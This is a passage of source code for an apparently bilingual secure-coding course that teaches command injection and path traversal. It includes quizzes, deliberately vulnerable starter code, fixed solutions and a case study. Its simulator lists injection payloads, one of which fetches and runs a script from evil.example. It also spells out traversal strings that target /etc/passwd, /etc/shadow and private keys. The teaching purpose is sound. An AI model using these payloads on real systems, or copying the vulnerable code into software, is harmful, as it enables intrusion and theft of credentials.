              th: 'ตราบใดที่ filename ยังถูกต่อเข้ากับสตริงคำสั่ง (ไม่ว่าจะใส่ quote ครอบหรือไม่) ก็ยังอันตราย: single quote ของคุณถูกปิดได้ด้วย x\'; id; echo \' ส่วน double quote ก็ยังปล่อยให้ `id` และ $(id) ทำงาน ให้ย้าย filename ไปเป็นสมาชิกหนึ่งตัวของ array argument แทน',
              en: 'As long as filename is concatenated into a command string — quoted or not — it stays dangerous: your single quote is closed by x\'; id; echo \', and double quotes still let `id` and $(id) run. Move filename into its own element of the arguments array.'
            }
          },
          {
            id: 'metachar-denylist',
            match: /(?:\.replace(?:All)?|\.includes|\.indexOf|\.search)\s*\(\s*(?:\/[^/\n]*[;&|><`$]|['"][^'"]*[;&|><`$])/,
            message: {
              th: 'การกรองอักขระ ; & | ` $ ไม่มีวันครบ: newline ทำหน้าที่เหมือน ; ทุกประการ, ${IFS} ใช้แทนช่องว่างได้, > เขียนไฟล์ทับได้ และการเข้ารหัสซ้อนก็หลบการกรองได้อีก ใช้ execFile กับ argv array แล้วอักขระเหล่านี้จะไม่มีความหมายพิเศษเลย',
              en: 'Filtering ; & | ` $ is never complete: a newline behaves exactly like ;, ${IFS} substitutes for a space, > overwrites files, and layered encoding slips past the filter anyway. Use execFile with an argv array and those characters lose all special meaning.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'ลองถามตัวเองว่า "มี shell อยู่ในเส้นทางนี้ไหม" ถ้าคำตอบคือมี ไม่ว่าจะกรองอักขระดีแค่ไหนก็ยังเสี่ยง เป้าหมายของโจทย์นี้คือกำจัด shell ออกไป ไม่ใช่เพิ่มกฎกรองให้ซับซ้อนขึ้น',
        en: 'Ask whether a shell is in the path at all. If it is, no amount of clever filtering makes it safe. The goal here is to remove the shell, not to filter better.'
      },
      {
        th: 'แยก "ชื่อโปรแกรม" ออกจาก "รายการ argument" ให้ชัดเจน เช่น โปรแกรมเป็นค่าคงที่ /usr/bin/convert และแต่ละ argument ถูกส่งเป็นคนละค่า โดยไม่ประกอบกลับเป็นสตริงเดียว',
        en: 'Separate the program from the argument list. The program is the constant /usr/bin/convert; the arguments are a list where each slot is exactly one value, never joined into a single string.'
      },
      {
        th: 'Java: new ProcessBuilder(Arrays.asList("/usr/bin/convert", src, "-resize",...)).start() — Node: execFile("/usr/bin/convert", [src, "-resize",...]) และห้ามใส่ { shell: true }',
        en: 'Java: new ProcessBuilder(Arrays.asList("/usr/bin/convert", src, "-resize", ...)).start(). Node: execFile("/usr/bin/convert", [src, "-resize", ...]) — and never { shell: true }.'
      }
    ],

    quiz: [
      {
        q: {
          th: 'ทีมแก้โดยใส่ single quote ครอบชื่อไฟล์: sh -c "convert \'" + name + "\' -resize 200x200 out.png" ผลลัพธ์คือ',
          en: 'A team "fixes" it by single-quoting the filename: sh -c "convert \'" + name + "\' -resize 200x200 out.png". The result is:'
        },
        choices: [
          { th: 'ปลอดภัยแล้ว เพราะ shell ไม่ตีความอักขระพิเศษที่อยู่ใน single quote', en: 'Safe — the shell does not interpret special characters inside single quotes' },
          { th: 'ยังไม่ปลอดภัย เพราะ attacker ส่ง x\'; id; echo \' เพื่อปิด quote ของคุณเอง รันคำสั่ง แล้วเปิด quote ใหม่ให้สมดุล', en: 'Still unsafe — an attacker sends x\'; id; echo \' to close your quote, run a command, and reopen a quote so it balances' },
          { th: 'ปลอดภัยแล้ว ถ้าเปลี่ยนเป็น double quote เพราะ double quote เข้มงวดกว่า', en: 'Safe if you switch to double quotes, since double quotes are stricter' },
          { th: 'ปลอดภัยแล้ว ถ้าเพิ่มการบล็อกอักขระ ; และ && ควบคู่ไปด้วย', en: 'Safe once you also block the ; and && characters' }
        ],
        answer: 1,
        why: {
          th: 'quote ที่คุณเขียนกับ payload ของ attacker อยู่ในสตริงเดียวกัน attacker เลยคุมได้ว่า quote จะเปิดหรือปิดตรงไหน พอปิด quote ของคุณได้ ส่วนที่เหลือก็เป็น syntax shell ปกติ วิธีเดียวที่แก้จริงคือไม่ส่งสตริงให้ shell ตีความตั้งแต่แรก',
          en: 'Your quotes and the attacker\'s payload live in the same string, so the attacker controls where quoting opens and closes. Once your quote is closed, the rest is ordinary shell syntax. The only real fix is never handing a string to a shell to interpret.'
        },
        whyWrong: [
          { th: 'จริงที่ single quote ปิดการตีความ แต่เฉพาะตอนที่ attacker แทรก quote ตัวปิดไม่ได้ ซึ่งในที่นี้แทรกได้เพราะค่าถูกต่อเข้าไปดิบ ๆ', en: 'It is true that single quotes suppress interpretation — but only while the attacker cannot inject a closing quote, which here they can, because the value is concatenated in raw.' },
          null,
          { th: 'double quote อ่อนกว่า single quote เสียอีก: ภายใน double quote ของ shell นั้น `command`, $(command) และ $VAR ยังถูกขยายตามปกติ', en: 'Double quotes are weaker than single quotes: inside shell double quotes, `command`, $(command) and $VAR all still expand.' },
          { th: 'denylist ยังเหลือ newline, |, ||, &, backtick, $(), >, ${IFS} และอื่น ๆ อีกมาก การไล่บล็อกไม่มีวันครบ', en: 'The denylist still leaves newline, |, ||, &, backticks, $(), >, ${IFS} and many more. Chasing them all is never complete.' }
        ]
      },
      {
        q: {
          th: 'ข้อใดต่อไปนี้ยังมีช่องโหว่ command injection (name มาจากผู้ใช้)',
          en: 'Which of these is still vulnerable to command injection (name comes from the user)?'
        },
        choices: [
          { th: 'new ProcessBuilder("/usr/bin/convert", name, "-resize", "200x200").start()', en: 'new ProcessBuilder("/usr/bin/convert", name, "-resize", "200x200").start()' },
          { th: 'new ProcessBuilder(List.of("/usr/bin/convert", name, "out.png")).start()', en: 'new ProcessBuilder(List.of("/usr/bin/convert", name, "out.png")).start()' },
          { th: 'new ProcessBuilder("/bin/sh", "-c", "convert " + name + " out.png").start()', en: 'new ProcessBuilder("/bin/sh", "-c", "convert " + name + " out.png").start()' },
          { th: 'execFile("/usr/bin/convert", [name, "-resize", "200x200", "out.png"])', en: 'execFile("/usr/bin/convert", [name, "-resize", "200x200", "out.png"])' }
        ],
        answer: 2,
        why: {
          th: 'ข้อนี้ส่ง /bin/sh พร้อม -c และสตริงที่ต่อค่าจากผู้ใช้เข้าไป ตัว ProcessBuilder ส่ง argv ถูกต้องก็จริง แต่สิ่งที่โปรแกรมปลายทาง (sh) ได้รับคือ "โปรแกรมภาษา shell" ที่มี payload ฝังอยู่ ความปลอดภัยไม่ได้มาจากคลาสที่ใช้ แต่มาจากการไม่มี shell ตัวเลือกอื่นส่งชื่อไฟล์เป็น argv หนึ่งช่อง จึงไม่มีการตีความ (แต่ยังควรตรวจว่า name ไม่ขึ้นต้นด้วย - เพื่อกัน argument injection)',
          en: 'This one passes /bin/sh with -c and a string containing the user value. ProcessBuilder delivers argv correctly, but what the target program (sh) receives is a shell program with the payload embedded in it. Safety comes from the absence of a shell, not from the class you use. The other options deliver the filename as a single argv slot, so nothing is interpreted — though you should still check that name does not start with - to prevent argument injection.'
        },
        whyWrong: [
          { th: 'name อยู่ใน argv ช่องของตัวเอง เลยไม่ถูกตีความเป็น syntax shell (ควรเสริม allowlist กันชื่อที่ขึ้นต้นด้วย - เท่านั้น)', en: 'name occupies its own argv slot and is never parsed as shell syntax (only add an allowlist to stop names starting with -).' },
          { th: 'List.of(...) ก็คือ argv array เหมือนกัน ProcessBuilder ส่งแต่ละสมาชิกให้โปรเซสโดยตรง', en: 'List.of(...) is the same argv array; ProcessBuilder hands each element straight to the process.' },
          null,
          { th: 'execFile ไม่ผ่าน /bin/sh (ตราบใดที่ไม่ใส่ shell: true) สมาชิกแต่ละตัวของ array เป็น argv หนึ่งช่อง', en: 'execFile does not go through /bin/sh (as long as shell: true is absent); each array element is one argv slot.' }
        ]
      }
    ],

    sim: {
      kind: 'shell',
      config: {
        bin: '/usr/bin/convert',
        argTemplate: '{{payload}} -resize 200x200 /tmp/out.png'
      },
      payloads: [
        { label: { th: 'ใส่เครื่องหมาย ; เพื่อต่อคำสั่งที่สองให้ server รันให้', en: 'Classic semicolon — chain a second command' }, value: 'photo.png; cat /etc/passwd' },
        { label: { th: 'Backtick — ผ่าน denylist ที่บล็อกแค่ ; และ &&', en: 'Backticks — slips past a denylist that only blocks ; and &&' }, value: 'photo.png`id`' },
        { label: { th: 'Command substitution — ดาวน์โหลดและรันสคริปต์ของ attacker', en: 'Command substitution — fetch and run the attacker\'s script' }, value: 'photo.png$(curl -s https://evil.example/r.sh | sh)' }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP OS Command Injection Defense Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html' },
      { label: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command', url: 'https://cwe.mitre.org/data/definitions/78.html' },
      { label: 'Node.js docs — child_process (exec vs execFile vs spawn)', url: 'https://nodejs.org/api/child_process.html' }
    ]
  };

 /* ======================================================================
 * 1.4 Path Traversal
 * ==================================================================== */
  const PATH_TRAVERSAL = {
    id: 'path-traversal',
    title: { th: 'Path Traversal', en: 'Path Traversal' },
    severity: 'High',
    cwe: 'CWE-22',
    owasp: 'A01:2021 – Broken Access Control',
    category: { th: 'Broken Access Control', en: 'Broken Access Control' },
    estMinutes: 12,
    points: 120,

    intro: {
      th: 'Endpoint ดาวน์โหลดไฟล์เอาชื่อไฟล์จาก query string ไปต่อกับโฟลเดอร์ฐาน /srv/app/user-files แล้วอ่านไฟล์นั้นออกมา ปัญหาอยู่ที่ฟังก์ชัน join ของทั้ง Java และ Node ไม่ได้บังคับให้อยู่ในโฟลเดอร์ มันแค่ประกอบ path ให้เท่านั้น ส่วน../ เป็น syntax ปกติของระบบไฟล์ที่แปลว่า "ถอยขึ้นไปหนึ่งชั้น" ค่าที่ผู้ใช้ส่งมาเลยพาโปรแกรมเดินออกนอกโฟลเดอร์ไปอ่านไฟล์อะไรก็ได้ที่โปรเซสอ่านได้',
      en: 'The download endpoint takes a filename from the query string, joins it onto the base directory /srv/app/user-files, and reads that file. The problem is that the join functions in both Java and Node do not confine anything — they only assemble a path — while ../ is ordinary filesystem syntax meaning "go up one level". So the user\'s value walks the program out of the directory and into any file the process is allowed to read.'
    },
    attack: {
      th: 'ยิง file=../../../../etc/passwd แล้ว path ที่ได้จะกลายเป็น /etc/passwd หลัง normalize ถ้าแอปกรองสตริง../ ทิ้ง ก็ใช้รูปแบบ URL-encoded..%2f..%2f..%2f..%2fetc%2fshadow ที่จะถูกถอดรหัสหลังผ่านตัวกรอง หรือถ้ากรองแบบไม่วนซ้ำก็ใช้....// ที่พอตัด../ ตรงกลางออกจะเหลือ../ พอดี และในหลายภาษา path แบบ absolute อย่าง /etc/passwd จะทำให้ผลลัพธ์ของ join/resolve ทิ้งโฟลเดอร์ฐานไปทั้งดุ้น ไฟล์ที่ attacker หมายตาจริง ๆ มักเป็น.env, application.yml, id_rsa และ /proc/self/environ',
      en: 'Send file=../../../../etc/passwd and the resulting path normalizes to /etc/passwd. If the app filters the string ../, use the URL-encoded form ..%2f..%2f..%2f..%2fetc%2fshadow, which is decoded after the filter runs; if the filter is non-recursive, use ....// — removing the inner ../ leaves a perfectly good ../. And in many languages an absolute path such as /etc/passwd makes join/resolve discard the base directory entirely. The files attackers actually want are .env, application.yml, id_rsa and /proc/self/environ.'
    },
    fix: {
      th: 'อย่าตรวจสตริงที่ผู้ใช้ส่งมา ให้ตรวจ "path สุดท้ายที่จะเปิดจริง" แทน ขั้นตอนคือ resolve ให้เป็น absolute path แล้ว normalize เพื่อยุบ../ ทั้งหมดออกให้หมดก่อน จากนั้นค่อยตรวจว่าผลลัพธ์ยังอยู่ใต้โฟลเดอร์ฐานหรือไม่ด้วย startsWith(BASE + ตัวคั่น) ลำดับสำคัญมาก: ต้อง normalize ก่อนแล้วค่อยตรวจ เพราะการตรวจสตริงก่อนยุบ../ ไม่ได้บอกอะไรเลยว่าไฟล์ปลายทางอยู่ที่ไหน และถ้าโฟลเดอร์นั้นมี symlink ได้ ให้เรียก toRealPath()/realpath() แล้วตรวจซ้ำอีกรอบ',
      en: 'Do not validate the string the user sent — validate the path you are actually about to open. Resolve it to an absolute path, normalize it so every ../ is collapsed away, and only then check that the result is still under the base directory using startsWith(BASE + separator). The order matters enormously: normalize first, check second, because inspecting the string before ../ is collapsed tells you nothing about where the file ends up. And if the directory can contain symlinks, call toRealPath()/realpath() and check again.'
    },
    keyPoints: {
      vuln: [
        { th: 'endpoint ต่อชื่อไฟล์จากผู้ใช้เข้ากับโฟลเดอร์ฐานแล้วอ่านไฟล์นั้น', en: 'The endpoint joins a user filename onto the base directory and reads that file.' },
        { th: 'ฟังก์ชัน join ไม่ได้บังคับให้อยู่ในโฟลเดอร์ มันแค่ประกอบ path ให้', en: 'The join function does not confine anything — it only assembles a path.' },
        { th: '../ เป็น syntax ปกติแปลว่าถอยขึ้นหนึ่งชั้น พาโปรแกรมออกนอกโฟลเดอร์', en: '../ is ordinary syntax for "go up one level", walking the program out of the folder.' }
      ],
      attack: [
        { th: 'attacker ส่ง file=../../../../etc/passwd โดย ../ หมายถึงถอยขึ้นหนึ่งโฟลเดอร์ เมื่อซ้ำหลายครั้ง path จึงออกจากโฟลเดอร์ที่อนุญาตและไปถึง /etc/passwd', en: 'Send file=../../../../etc/passwd and the path normalizes to /etc/passwd.' },
        { th: 'การกรองข้อความ ../ อย่างเดียวหลบได้ เช่น ..%2f ที่ถูก decode เป็น ../ ภายหลัง หรือ ....// ที่หลังตัดบางส่วนแล้วอาจกลับมาเป็น ../', en: 'Bypass filters with ..%2f (decoded later) or ....// which collapses back to ../.' },
        { th: 'attacker อาจส่ง absolute path เช่น /etc/passwd โดยตรง ซึ่งฟังก์ชันประกอบ path บางแบบอาจเลือก path นี้แทนโฟลเดอร์ฐาน', en: 'Send an absolute /etc/passwd so join discards the base directory entirely.' }
      ],
      fix: [
        { th: 'ประกอบ path ให้เป็น absolute path แล้ว normalize เพื่อยุบ ../ ให้หมดก่อน จากนั้นจึงตรวจ path จริงที่โปรแกรมกำลังจะเปิด ไม่ใช่ตรวจเพียงสตริงที่ผู้ใช้ส่งมา', en: 'Resolve to an absolute path, then normalize so every ../ is collapsed away.' },
        { th: 'หลัง normalize แล้ว ให้ตรวจว่า path สุดท้ายยังอยู่ภายใต้โฟลเดอร์ฐาน เช่น startsWith(BASE + ตัวคั่น) ถ้าหลุดออกนอกโฟลเดอร์ให้ปฏิเสธ', en: 'Check the result is still under the base with startsWith(BASE + separator).' },
        { th: 'ถ้าในโฟลเดอร์อาจมี symlink ให้ใช้ realpath/toRealPath() เพื่อหา path ปลายทางจริง แล้วตรวจซ้ำว่ายังอยู่ภายใต้โฟลเดอร์ที่อนุญาต', en: 'Call realpath and re-check when the directory can contain symlinks.' }
      ]
    },
    impact: {
      th: 'attacker อาจอ่านไฟล์ใด ๆ ที่โปรเซสของแอปมีสิทธิ์เข้าถึง รวมถึงไฟล์ config, password ของ database หรือ private key ซึ่งอาจนำไปสู่การเข้าถึงระบบอื่นต่อได้',
      en: 'The attacker can read any file the process can reach — including config files holding database passwords and private keys, which usually opens the door to full system compromise.'
    },

    caseStudy: {
      year: 2021,
      title: {
        th: 'CVE-2021-41773 — Apache HTTP Server 2.4.49 path traversal สู่ RCE',
        en: 'CVE-2021-41773 — Apache HTTP Server 2.4.49 path traversal to RCE'
      },
      body: {
        th: 'เมื่อวันที่ 5 ตุลาคม 2021 มีการเปิดเผยช่องโหว่ใน Apache HTTP Server 2.4.49 ที่การ normalize path ทำงานไม่ครบ ทำให้ URL แมปไปยังไฟล์นอกโฟลเดอร์ที่กำหนดไว้ด้วย Alias ได้ และหากเปิด CGI ไว้บน path นั้นก็ยกระดับเป็น remote code execution ช่องโหว่นี้ถูกโจมตีจริงในวงกว้างจน CISA นำเข้า Known Exploited Vulnerabilities Catalog ที่น่าสนใจสำหรับผู้เรียนคือแพตช์แรกใน 2.4.50 ยังแก้ไม่ครบ (ยังหลบได้ด้วยการเข้ารหัสซ้อน) จนต้องออก CVE-2021-42013 และแก้จริงใน 2.4.51 — เป็นตัวอย่างชั้นดีว่าการ "กรองสตริง../" ให้ถูกต้องนั้นยากแค่ไหน แม้แต่กับทีมที่เขียน web server เอง',
        en: 'On 5 October 2021 a flaw was disclosed in Apache HTTP Server 2.4.49 where path normalization was incomplete, allowing URLs to map to files outside the directories configured by Alias-like directives — and, where CGI was enabled on those paths, escalating to remote code execution. It was exploited widely enough that CISA added it to the Known Exploited Vulnerabilities Catalog. The instructive part: the first patch in 2.4.50 was itself incomplete (bypassable with double encoding), requiring CVE-2021-42013 and a real fix in 2.4.51 — a perfect illustration of how hard "filter out ../ correctly" is, even for the people who write web servers.'
      },
      source: {
        label: 'NVD — CVE-2021-41773',
        url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773'
      }
    },

    codeReview: [
      {
        th: 'ตอน Code Review ให้ค้นหา new File(base, x), Paths.get(base + x), path.join(BASE, req.query...), fs.readFile/createReadStream ที่ path มีค่าจากผู้ใช้ปน แล้วถามว่าตรวจ path ก่อนเปิดหรือยัง',
        en: 'grep for new File(base, x), Paths.get(base + x), path.join(BASE, req.query...), and any fs.readFile/createReadStream whose path contains user input.'
      },
      {
        th: 'มองหา "บรรทัดที่ตรวจ containment": ต้องมี normalize()/resolve() ตามด้วย startsWith(BASE) ถ้าไม่มีบรรทัดนี้ ให้ถือว่ามีช่องโหว่ไว้ก่อน จนกว่าจะพิสูจน์ได้ว่าไม่มี',
        en: 'Always look for the containment line: normalize()/resolve() followed by startsWith(BASE). If it is missing, treat the code as vulnerable until proven otherwise.'
      },
      {
        th: 'ระวังลำดับผิด: ตรวจสตริงก่อนแล้วค่อย resolve การตรวจก่อน normalize บอกไม่ได้ว่าไฟล์จริงอยู่ที่ไหน ต้อง resolve/normalize ให้เสร็จก่อนแล้วค่อยตรวจ',
        en: 'Wrong order: checking the string first and resolving afterwards. Resolve and normalize first, then check.'
      },
      {
        th: 'startsWith(BASE) ที่ไม่มีตัวคั่นต่อท้าย ระวัง /srv/app/user-files-evil จะผ่านการตรวจแบบนี้ได้ ต้องเทียบกับ BASE + File.separator / path.sep',
        en: 'A startsWith(BASE) with no trailing separator — /srv/app/user-files-evil passes that check. Compare against BASE + File.separator / path.sep.'
      },
      {
        th: 'ฝั่ง unzip/แตกไฟล์ก็เสี่ยง: ชื่อ entry ใน zip ก็เป็น input ที่ไม่น่าเชื่อถือ (Zip Slip) นำ ../ ในชื่อ entry เขียนไฟล์ออกนอกโฟลเดอร์ได้ ต้องตรวจ containment ทุก entry เหมือนกัน',
        en: 'On the unzip side, archive entry names are equally untrusted input (Zip Slip) — apply the same containment check to every entry.'
      }
    ],

    testIt: {
      cmd: "curl -s -G 'http://localhost:8080/files/download' --data-urlencode 'file=../../../../etc/passwd'",
      note: {
        th: 'แอปที่มีช่องโหว่จะคืนเนื้อไฟล์ /etc/passwd ออกมา (มองหาบรรทัด root:x:0:0:) ส่วนแอปที่แก้แล้วจะตอบ 400 พร้อมข้อความว่า path ไม่ถูกต้อง ลองส่ง request ซ้ำด้วย file=..%2f..%2f..%2f..%2fetc%2fpasswd และ file=/etc/passwd ด้วย เพราะสองแบบนี้คือจุดที่การกรองสตริงมักพลาด',
        en: 'A vulnerable app returns the contents of /etc/passwd (look for the root:x:0:0: line); a fixed app answers 400 with an invalid-path message. Repeat with file=..%2f..%2f..%2f..%2fetc%2fpasswd and file=/etc/passwd as well — those are precisely where string filtering fails.'
      }
    },

    pitfalls: [
      {
        title: {
          th: 'บล็อกทุก request ที่มี ../',
          en: '"I reject any request containing ../"'
        },
        why: {
          th: 'คุณกำลังตรวจสตริง ไม่ได้ตรวจ path จริง ทางหลบมีเยอะมาก: (1) URL-encoded..%2f..%2f หรือ double-encoded..%252f ซึ่งจะถูกถอดรหัสหลังตัวกรองของคุณทำงานไปแล้ว (2) path แบบ absolute อย่าง /etc/passwd ที่ไม่มี../ เลยสักตัว แต่ทำให้ resolve/join ทิ้ง base directory ไปทั้งหมด (3)....// ซึ่งพอตัด../ ตรงกลางออกครั้งเดียวจะเหลือ../ พอดี (4) บน Windows ใช้..\\ ได้ และ (5) symlink ในโฟลเดอร์ที่ผู้ใช้อัปโหลดได้ ซึ่งชี้ออกนอก base โดยไม่มี../ ปรากฏใน request เลย ทางแก้คือ resolve + normalize แล้วค่อยตรวจว่า path สุดท้ายอยู่ใต้ base จริงไหม',
          en: 'You are checking a string, not the real path, and there are many ways around it: (1) URL-encoded ..%2f..%2f or double-encoded ..%252f, decoded after your filter runs; (2) an absolute path like /etc/passwd, which contains no ../ at all yet makes resolve/join discard the base directory entirely; (3) ....// — strip the inner ../ once and you are left with a working ../; (4) ..\\ on Windows; and (5) a symlink inside a user-writable directory that points outside the base without any ../ appearing in the request. The fix is to resolve and normalize, then check that the final path really is under the base.'
        },
        short: {
          th: 'คุณตรวจสตริงไม่ใช่ path จริง — encode ซ้อน absolute และ symlink หลบได้',
          en: 'You check a string, not the real path; encoding, absolute paths and symlinks bypass it.'
        }
      },
      {
        title: {
          th: 'ตรวจนามสกุลไฟล์ว่าเป็น .pdf',
          en: '"I check that the extension is .pdf"'
        },
        why: {
          th: 'นามสกุลบอกว่าไฟล์ "ชนิดไหน" ไม่ได้บอกว่าไฟล์ "อยู่ที่ไหน"../../../../srv/other-tenant/invoice.pdf ผ่านการตรวจนามสกุลทุกข้อ แต่เป็นไฟล์ของลูกค้ารายอื่น เช่นเดียวกับ../../backups/dump.pdf ที่อาจเป็น dump ของ database การตรวจนามสกุลมีประโยชน์ในแง่อื่น (กันการ serve ไฟล์ชนิดที่ไม่ต้องการ) แต่ไม่ใช่การคุมขอบเขตโฟลเดอร์ ต้องมีการตรวจ containment แยกต่างหากเสมอ',
          en: 'An extension tells you what kind of file it is, not where it lives. ../../../../srv/other-tenant/invoice.pdf passes every extension check and is another customer\'s document; so does ../../backups/dump.pdf, which might be a database dump. Extension checks are useful for other reasons (not serving unwanted file types) but they are not directory confinement — you always need a separate containment check.'
        },
        short: {
          th: 'นามสกุลบอกชนิดไฟล์ ไม่ได้บอกว่าไฟล์อยู่ที่ไหน — ต้องตรวจ containment',
          en: 'An extension says what a file is, not where it lives; you still need a containment check.'
        }
      },
      {
        title: {
          th: 'เรียก startsWith(BASE)',
          en: '"I call startsWith(BASE), that should do it"'
        },
        why: {
          th: 'ถูกทาง แต่ต้องระวังสองจุด: (1) ถ้ายังไม่ normalize ก่อน สตริง /srv/app/user-files/../../etc/passwd จะผ่าน startsWith(BASE) ได้สบาย ๆ ทั้งที่ชี้ไปที่ /etc/passwd (2) การเทียบสตริงเปล่า ๆ ทำให้ /srv/app/user-files-evil/secret ผ่านด้วย เพราะมันขึ้นต้นด้วย /srv/app/user-files จริง ๆ ให้เทียบกับ BASE + ตัวคั่น (path.sep / File.separator) หรือใช้ Path.startsWith ของ Java ซึ่งเทียบทีละ component ไม่ใช่ทีละตัวอักษร',
          en: 'Right direction, two traps. (1) Without normalizing first, the string /srv/app/user-files/../../etc/passwd sails through startsWith(BASE) while pointing at /etc/passwd. (2) A raw string comparison also admits /srv/app/user-files-evil/secret, because it genuinely does start with /srv/app/user-files. Compare against BASE plus the separator (path.sep / File.separator), or use Java\'s Path.startsWith, which compares path components rather than characters.'
        },
        short: {
          th: 'ต้อง normalize ก่อน และเทียบกับ BASE + ตัวคั่น ไม่ใช่สตริงเปล่า',
          en: 'Normalize first, and compare against BASE + separator, not a bare string.'
        }
      }
    ],

    languages: {
      java: {
        filename: 'UserFileService.java',
        lang: 'java',
        starter:
`package com.acme.docs;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

/** ดาวน์โหลดไฟล์แนบของผู้ใช้: GET /files/download?file=... */
public class UserFileService {

    private static final String BASE = "/srv/app/user-files";

 // name มาจาก query string โดยตรง
    public byte[] download(String name) throws IOException {
        File target = new File(BASE, name);
        if (!target.exists()) {
            throw new IOException("not found");
        }
        return Files.readAllBytes(target.toPath());
    }
}`,
        solution:
`package com.acme.docs;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class UserFileService {

    private static final Path BASE =
            Paths.get("/srv/app/user-files").toAbsolutePath().normalize();

    public byte[] download(String name) throws IOException {
 // resolve + normalize ยุบ ../ ออกให้หมดก่อน แล้วค่อยตรวจขอบเขต
        Path target = BASE.resolve(name).normalize();
        if (!target.startsWith(BASE)) {
            throw new SecurityException("path escapes base directory");
        }
 // toRealPath() เดินตาม symlink จริง กัน link ที่ชี้ออกนอก BASE
        Path real = target.toRealPath();
        if (!real.startsWith(BASE)) {
            throw new SecurityException("symlink escapes base directory");
        }
        return Files.readAllBytes(real);
    }
}`,
        explain: {
          th: 'จุดสำคัญคือลำดับ: BASE.resolve(name) ให้ path เต็ม แล้ว.normalize() ยุบทุก../ ออกทันที ค่าอย่าง../../../../etc/passwd จึงกลายเป็น /etc/passwd ก่อนถึงบรรทัดตรวจ ทำให้ startsWith(BASE) เห็นความจริงว่ามันออกนอกโฟลเดอร์ไปแล้วและปฏิเสธ ถ้าผู้ใช้ส่ง path แบบ absolute มา resolve() จะคืนค่านั้นโดยตรง (ทิ้ง BASE) ซึ่งก็ตกที่ startsWith เช่นกัน ที่สำคัญ Path.startsWith ของ Java เทียบทีละ component ไม่ใช่ทีละตัวอักษร /srv/app/user-files-evil จึงไม่ผ่าน ส่วน toRealPath() ปิดช่อง symlink ซึ่งจำเป็นเมื่อผู้ใช้เขียนไฟล์ลงโฟลเดอร์นี้ได้',
          en: 'The order is what matters: BASE.resolve(name) produces the full path and .normalize() immediately collapses every ../, so ../../../../etc/passwd becomes /etc/passwd before the check runs — and startsWith(BASE) sees the truth and rejects it. If the user supplies an absolute path, resolve() returns it directly (discarding BASE), which also fails startsWith. Importantly, Java\'s Path.startsWith compares whole path components rather than characters, so /srv/app/user-files-evil does not pass. toRealPath() then closes the symlink hole, which matters whenever users can write into this directory.'
        },
        checks: [
          {
            id: 'no-raw-file-join',
            label: { th: 'ไม่ใช้ new File(BASE, name) หรือการต่อสตริง path', en: 'No new File(BASE, name) and no string concatenation of paths' },
            hint: { th: 'เปลี่ยนไปใช้ Path BASE แล้วเรียก BASE.resolve(name)', en: 'Switch to a Path BASE and call BASE.resolve(name)' },
            weight: 2,
            mustNotMatch: /new\s+File\s*\(|BASE\s*\+|\+\s*name\b|\bname\s*\+/
          },
          {
            id: 'normalize-path',
            label: { th: 'normalize() path เพื่อยุบ../ ก่อนตรวจ', en: 'Calls normalize() to collapse ../ before checking' },
            hint: { th: 'เรียก.normalize() ต่อท้าย BASE.resolve(name) เสมอ', en: 'Always chain .normalize() after BASE.resolve(name)' },
            weight: 3,
            mustMatch: /\.normalize\s*\(\s*\)/
          },
          {
            id: 'resolve-under-base',
            label: { th: 'สร้าง path ปลายทางจาก BASE ด้วย resolve()', en: 'Builds the target path from BASE with resolve()' },
            hint: { th: 'ใช้ BASE.resolve(name) แทนการประกอบ path เอง', en: 'Use BASE.resolve(name) instead of assembling the path yourself' },
            weight: 2,
            mustMatch: /\.resolve\s*\(/
          },
          {
            id: 'containment-guard',
            label: { th: 'ตรวจว่า path สุดท้ายยังอยู่ใต้ BASE (startsWith)', en: 'Verifies the final path is still under BASE (startsWith)' },
            hint: { th: 'เพิ่มเงื่อนไข if (!target.startsWith(BASE)) แล้วปฏิเสธ', en: 'Add if (!target.startsWith(BASE)) and reject' },
            weight: 3,
            mustMatch: /\.startsWith\s*\(/
          },
          {
            id: 'reject-on-escape',
            label: { th: 'ปฏิเสธ request เมื่อ path ออกนอกขอบเขต', en: 'Rejects the request when the path escapes' },
            hint: { th: 'throw new SecurityException(...) เมื่อการตรวจ containment ไม่ผ่าน', en: 'throw new SecurityException(...) when the containment check fails' },
            weight: 1,
            mustMatch: /throw\s+new\s+\w+/
          }
        ],
        traps: [
          {
            id: 'dotdot-denylist',
            match: /\.(?:replace|replaceAll|replaceFirst|contains|indexOf|startsWith|endsWith)\s*\(\s*"\.\./,
            message: {
              th: 'การกรองสตริง ".." ไม่ครอบคลุม:..%2f จะถูกถอดรหัสหลังตัวกรองของคุณ,....// จะเหลือ../ หลังลบครั้งเดียว, path แบบ absolute อย่าง /etc/passwd ไม่มี.. เลยสักตัว และ symlink ก็ออกนอก base ได้โดยไม่มี.. ปรากฏ ให้ resolve + normalize แล้วตรวจ startsWith(BASE) แทน',
              en: 'Filtering the string ".." is not sufficient: ..%2f is decoded after your filter, ....// leaves a working ../ after one removal pass, an absolute path such as /etc/passwd contains no .. at all, and a symlink escapes the base without any .. appearing. Resolve, normalize, then check startsWith(BASE) instead.'
            }
          },
          {
            id: 'extension-check-only',
            match: /\.endsWith\s*\(\s*"\.[A-Za-z0-9]{2,5}"/,
            message: {
              th: 'การตรวจนามสกุลบอกได้แค่ชนิดไฟล์ ไม่ได้บอกว่าไฟล์อยู่ที่ไหน../../../../srv/other-tenant/invoice.pdf ผ่านการตรวจนี้ทุกข้อแต่เป็นเอกสารของลูกค้ารายอื่น ต้องมีการตรวจ containment แยกต่างหากด้วยเสมอ',
              en: 'An extension check tells you the file type, not its location. ../../../../srv/other-tenant/invoice.pdf passes it while being another customer\'s document. You always need a separate containment check as well.'
            }
          }
        ]
      },

      node: {
        filename: 'fileRoutes.js',
        lang: 'js',
        starter:
`const express = require('express');
const path = require('path');
const fs = require('fs/promises');

const BASE = '/srv/app/user-files';
const app = express();

// GET /files/download?file=report.pdf
app.get('/files/download', async (req, res) => {
  const target = path.join(BASE, req.query.file);
  try {
    const data = await fs.readFile(target);
    res.type('application/octet-stream').send(data);
  } catch (err) {
    res.status(404).json({ error: 'not found' });
  }
});

module.exports = app;`,
        solution:
`const express = require('express');
const path = require('path');
const fs = require('fs/promises');

const BASE = path.resolve('/srv/app/user-files');
